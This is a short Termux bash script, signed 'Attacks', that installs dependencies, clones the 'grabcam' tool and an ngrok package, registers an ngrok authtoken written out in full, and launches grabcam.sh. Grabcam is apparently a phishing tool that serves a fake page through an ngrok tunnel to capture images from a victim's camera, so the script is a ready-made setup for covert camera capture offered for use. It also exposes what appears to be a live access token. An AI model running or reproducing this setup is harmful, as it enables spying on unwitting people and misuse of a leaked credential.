#!bin/bash
#by: Attacks

echo -e ""
echo -e "\e[1;36m[\e[1;31m+\e[1;36m] \e[1;32mInstalando programas necesarios por favor espere..."
echo -e ""
sleep 5

pkg update && pkg upgrade -y
sleep 1
pkg install python python2 php
sleep 1
pip install wget
sleep 1
pip install lolcat
cd $HOME
sleep 1
git clone https://github.com/noob-hackers/grabcam
sleep 1
git clone https://github.com/Darkmux/NgrokTH
cd NgrokTH
cp ngrok-stable-linux-arm.zip $HOME
cd $HOME
unzip ngrok-stable-linux-arm.zip
rm -rf ngrok-stable-linux-arm.zip
./ngrok authtoken 1pzIKYeGaWvKh0LeIYGvFbYqrJo_5XJxRspjkd9NemhPfu6kw
sleep 1
cp ngrok /data/data/com.termux/files/home/grabcam
sleep 2
cd
sleep 1
cd grabcam
chmod +x *
bash grabcam.sh
